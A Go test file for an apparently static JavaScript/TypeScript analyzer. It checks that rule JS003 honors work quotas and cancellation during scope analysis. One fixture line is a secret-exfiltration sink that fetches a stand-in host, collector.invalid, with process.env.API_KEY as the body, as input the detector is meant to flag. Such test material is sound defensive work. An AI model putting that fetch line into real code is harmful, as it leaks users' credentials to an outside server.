//go:build !coreonly && cgo

package javascript_test

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/analysis/analysisbudget"
	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/javascript"
	"github.com/skarm/scout/internal/capture/artifact"
)

func TestScopeCopiesSpendTheOperationQuota(t *testing.T) {
	for _, expression := range []string{"if(flag){let inner=0;}", "function helper(){let inner=0;}", "value ||= 1;"} {
		t.Run(expression, func(t *testing.T) {
			var setup strings.Builder
			for i := range 32 {
				fmt.Fprintf(&setup, "let local%d=0;", i)
			}
			const sink = "fetch('https://collector.invalid',{body:process.env.API_KEY});"
			text := setup.String() + sink + expression + sink
			doc := document.Prepare(t.Context(), artifact.NewFile("input.js", []byte(text), false))
			for _, rule := range javascript.Rules() {
				if rule.Rule().ID != "JS003" {
					continue
				}
				// The same declarations in a finished sibling block need no
				// copying when the expression examines its outer scope.
				control := "{" + setup.String() + "}" + sink + expression + sink
				sibling := document.Prepare(t.Context(), artifact.NewFile("input.js", []byte(control), false))
				sufficient := analysisbudget.WithLimit(t.Context(), 4096)
				both, err := rule.Find(sufficient, sibling, 10)
				if err != nil || len(both.Matches) != 2 {
					t.Fatalf("sibling scope control failed: %+v %v", both, err)
				}
				limit := analysisbudget.Used(sufficient)
				bounded := analysisbudget.WithLimit(t.Context(), limit)
				result, err := rule.Find(bounded, doc, 10)
				if err == nil || !analysisbudget.Exhausted(bounded) || analysisbudget.Used(bounded) > limit || len(result.Matches) != 1 || result.Matches[0].Start != setup.Len() {
					t.Fatalf("scope work bypassed quota or lost prior evidence: used=%d result=%+v err=%v", analysisbudget.Used(bounded), result, err)
				}
				cancelled, cancel := context.WithCancel(t.Context())
				cancel()
				if _, err := rule.Find(cancelled, doc, 10); !errors.Is(err, context.Canceled) {
					t.Fatal("cancellation ignored", err)
				}
				complete, err := rule.Find(analysisbudget.WithLimit(t.Context(), 4096), doc, 10)
				if err != nil || len(complete.Matches) != 2 {
					t.Fatalf("fresh quota failed to recover: %+v %v", complete, err)
				}
				return
			}
			t.Fatal("JS003 is not registered")
		})
	}
}

func TestPredeclaredNamesSpendWorkBeforeReturn(t *testing.T) {
	names := make([]string, 24)
	for i := range names {
		names[i] = fmt.Sprintf("note%d", i)
	}

	list := strings.Join(names, ", ")
	for _, lang := range []string{"js", "ts"} {
		for _, tc := range []struct {
			name, text string
			many       bool
		}{
			{"empty", "function render() { return 1; }", false},
			{"declarations", "function render() { return 1; let " + strings.Join(names, "; let ") + "; }", true},
			{"group", "function render() { return 1; let " + list + "; }", true},
			{"pattern", "function render() { return 1; let {" + list + "} = {}; }", true},
			{"parameters", "function render(" + list + ") { return 1; }", true},
		} {
			t.Run(lang+"/"+tc.name, func(t *testing.T) {
				doc := document.Prepare(t.Context(), artifact.NewFile("sample."+lang, []byte(tc.text), false))
				for _, limit := range []uint64{20, 2048} {
					ctx := analysisbudget.WithLimit(t.Context(), limit)
					result, err := javascript.Rules()[0].Find(ctx, doc, 10)
					if tc.many && limit == 20 {
						if err == nil || !analysisbudget.Exhausted(ctx) {
							t.Fatalf("admitted %d names on quota %d", len(names), limit)
						}
					} else if err != nil || analysisbudget.Exhausted(ctx) || len(result.Matches) != 0 {
						t.Fatalf("limit=%d: result=%+v err=%v", limit, result, err)
					}
				}
			})
		}
	}
}
